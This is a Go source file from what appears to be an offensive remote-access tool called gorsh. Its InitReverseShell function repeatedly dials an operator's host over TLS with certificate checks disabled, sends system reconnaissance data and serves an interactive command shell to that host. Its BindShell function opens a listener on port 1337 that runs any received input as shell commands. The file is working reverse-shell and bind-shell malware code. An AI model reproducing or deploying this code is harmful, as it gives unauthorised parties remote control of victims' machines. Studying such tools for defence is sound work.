package core

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"log"
	"net"
	"os"
	"time"

	"git.hyrule.link/blink/gorsh/pkg/cmds"
	"git.hyrule.link/blink/gorsh/pkg/myconn"
	"git.hyrule.link/blink/gorsh/pkg/sitrep"
	"github.com/abiosoft/ishell"
	"github.com/abiosoft/readline"
)

const (
	ErrCouldNotDecode  = 1 << iota
	ErrHostUnreachable = iota
	ErrBadFingerprint  = iota
)

func InitReverseShell(connectString string, fingerprint []byte) {
	config := &tls.Config{InsecureSkipVerify: true}
	for {
		var err error
		myconn.Conn, err = tls.Dial("tcp", connectString, config)
		if err != nil {
			log.Printf("%s unreachable, trying agian in 5 seconds", connectString)
		}
		StartShell(&myconn.Conn)
		time.Sleep(5 * time.Second)
	}
}

func StartShell(conn *myconn.Writer) {
	sh := NewIShell(conn)
	myconn.Send(myconn.Conn, sitrep.InitialInfo())

	// start with an initial system shell to allow
	// platypus to fingerprint; remove otherwise
	sh.Process("shell")

	sh.Run()
	os.Exit(0)
}

func NewIShell(conn *myconn.Writer) *ishell.Shell {
	hostname, _ := os.Hostname()
	conf := &readline.Config{
		Prompt:              fmt.Sprintf("[%s]> ", hostname),
		Stdin:               *conn,
		StdinWriter:         *conn,
		Stdout:              *conn,
		Stderr:              *conn,
		FuncIsTerminal:      func() bool { return true },
		ForceUseInteractive: true,
		// VimMode:             true,
		// UniqueEditLine:      true,
		// FuncMakeRaw:         func() error { return nil },
		// FuncExitRaw:         func() error { return nil },
	}

	sh := ishell.NewWithConfig(conf)
	cmds.RegisterCommands(sh)
	cmds.RegisterWindowsCommands(sh)
	cmds.RegisterNotWindowsCommands(sh)

	return sh
}

func BindShell() {
	go func() {
		listener, err := net.Listen("tcp", ":1337")
		if err != nil {
			log.Printf("Listen Error: %s\n", err)
			return
		}

		log.Println("Listening...")
		for {
			var conn myconn.Writer
			conn, err := listener.Accept()
			if err != nil {
				log.Printf("Listener Accept Error: %s\n", err)
				continue
			}
			sh := NewIShell(&conn)

			go func(conn myconn.Writer) {
				defer conn.Close()
				for {

					log.Println("Accepted a request. Reading content")
					var input []byte
					stream := bufio.NewReader(conn)
					input, _, err := stream.ReadLine()
					if err != nil {
						log.Printf("Listener: Read error: %s", err)
					}
					log.Printf("RECEIVED: %s\n", input)
					sh.Process(string(input))

				}
			}(conn)
		}
	}()
}